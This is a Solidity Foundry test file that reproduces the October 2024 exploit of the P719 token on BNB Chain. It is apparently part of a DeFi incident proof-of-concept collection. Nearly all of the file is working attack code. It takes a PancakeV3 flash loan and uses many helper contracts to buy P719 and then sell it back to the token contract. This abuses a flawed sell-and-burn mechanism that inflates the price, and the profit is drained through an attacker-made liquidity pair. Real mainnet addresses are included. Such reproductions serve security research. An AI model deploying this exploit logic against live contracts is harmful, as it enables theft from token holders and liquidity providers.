// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 547.18 BNB (~$312K USD)
// Attacker : https://bscscan.com/address/0xfeb19ae8c0448f25de43a3afcb7b29c9cef6eff6
// Attack Contract : https://bscscan.com/address/0x3f32c7cfb0a78ddea80a2384ceb4633099cbdc98
// Vulnerable Contract : https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc
// Attack Tx : https://bscscan.com/tx/0x9afcac8e82180fa5b2f346ca66cf6eb343cd1da5a2cd1b5117eb7eaaebe953b3
// @Info
// Vulnerable Contract Code : https://bscscan.com/token/0x6beee2b57b064eac5f432fc19009e3e78734eabc#code
// Not verified contract but the bug lies in `transfer()` function, when tokens are transferred to P719,
// the action is processed as a sell, using a Uniswap-like swap mechanism to calculate the BNB amount to
// be swapped.
// After the swap, P719 burns the majority of sold tokens and transfers fee tokens from itself, which could
// wrongly inflates the token's price.
// More info: https://x.com/TenArmorAlert/status/1844929489823989953

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant P719 = 0x6bEee2B57b064EAC5F432FC19009E3E78734Eabc;

contract P719Token_exp is Test {
    address attacker = makeAddr("attacker");
    MyToken myToken;

    function setUp() public {
        vm.createSelectFork("bsc", 43_023_423 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attackerC = new AttackerC();
        vm.label(address(attackerC), "attackerC");

        // First the attacker create a owned token
        myToken = new MyToken();

        // Second create a pair in uniswap with WBNB
        vm.deal(attacker, 0.001 ether);
        myToken.approve(PancakeRouter, type(uint256).max);
        (,, uint256 liquidity) = IFS(PancakeRouter).addLiquidityETH{value: 0.001 ether}(
            address(myToken), 100 ether, 100 ether, 0.001 ether, attacker, block.timestamp
        );

        // Third create severals buy/sell contract to attack P719 contract
        attackerC.setup(address(myToken));

        // Fourth attack and sell to the created pair
        attackerC.attack();

        // Finally remove liquidity from the pair
        address factory = IFS(PancakeRouter).factory();
        address myPair = IFS(factory).getPair(weth, address(myToken));
        IERC20(myPair).approve(PancakeRouter, type(uint256).max);
        IFS(PancakeRouter).removeLiquidityETH(
            address(myToken), liquidity, 0, 547_180_977_558_295_682_131, attacker, block.timestamp
        );

        console.log("Final balance in WETH:", attacker.balance);
    }
}

contract AttackerC {
    address myToken;

    AttackerC2[] attackerC2s33;
    AttackerC2[] attackerC2s100;

    function setup(
        address _myToken
    ) external {
        myToken = _myToken;

        for (uint256 i; i < 33; i++) {
            attackerC2s33.push(new AttackerC2());
        }
        for (uint256 i; i < 100; i++) {
            attackerC2s100.push(new AttackerC2());
        }
    }

    function attack() external {
        IFS(PancakeV3Pool).flash(
            address(this), 0, 4000 ether, hex"0000000000000000000000000000000000000000000000000000000000000001"
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        IFS(weth).withdraw(4000 ether);
        //uint256 supply = IERC20(P719).totalSupply();

        for (uint256 i; i < 14; i++) {
            AttackerC2 attC2 = new AttackerC2();
            attC2.buy{value: 10 ether}();
        }

        //uint256 supply = IERC20(P719).totalSupply();
        //uint256 bal = IERC20(P719).balanceOf(P719);

        for (uint256 i; i < attackerC2s33.length; i++) {
            //uint256 bal0 = IERC20(P719).balanceOf(P719);
            attackerC2s33[i].buy{value: 100 ether}();
            //uint256 bal1 = IERC20(P719).balanceOf(P719);
        }

        AttackerC2 attC2 = new AttackerC2();

        for (uint256 i; i < attackerC2s33.length; i++) {
            IERC20(P719).transferFrom(
                address(attackerC2s33[i]), address(attC2), IERC20(P719).balanceOf(address(attackerC2s33[i]))
            );
        }

        //IERC20(P719).approve(msg.sender, type(uint256).max);
        uint256 balAttC4 = IERC20(P719).balanceOf(address(attC2));

        for (uint256 i; i < attackerC2s100.length; i++) {
            IERC20(P719).transferFrom(address(attC2), address(attackerC2s100[i]), balAttC4 / 100);
            attackerC2s100[i].sell(balAttC4 / 100);
        }

        //uint256 supply2 = IERC20(P719).totalSupply();
        IFS(weth).deposit{value: address(this).balance}();

        uint256 bal3 = IERC20(weth).balanceOf(address(this));

        IERC20(weth).approve(PancakeRouter, type(uint256).max);
        //IERC20(myToken).approve(PancakeRouter, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = myToken;

        IFS(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal3 - 4000 ether - fee1, 0, path, address(this), block.timestamp
        );

        IERC20(weth).transfer(PancakeV3Pool, 4000 ether + fee1);
    }

    receive() external payable {}
}

contract AttackerC2 {
    constructor() public payable {
        IERC20(P719).approve(msg.sender, type(uint256).max);
    }

    function buy() external payable {
        P719.call{value: msg.value}("");
    }

    // Used by attackerC2s33 and attackerC2s100contracts
    function sell(
        uint256 amount
    ) external {
        IERC20(P719).transfer(P719, amount);
        msg.sender.call{value: address(this).balance}("");
    }

    // Used by attackerC2s33 and attackerC2s100contracts
    receive() external payable {}
}

contract MyToken {
    constructor() {
        balanceOf[msg.sender] += 10_000_000_000_000_000 ether;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        return true;
    }
}

interface IFS {
    // PancakeV3Pool
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;

    // WETH
    function withdraw(
        uint256
    ) external;
    function deposit() external payable;

    // PancakeRouter
    function factory() external view returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    // PancakeFactory
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
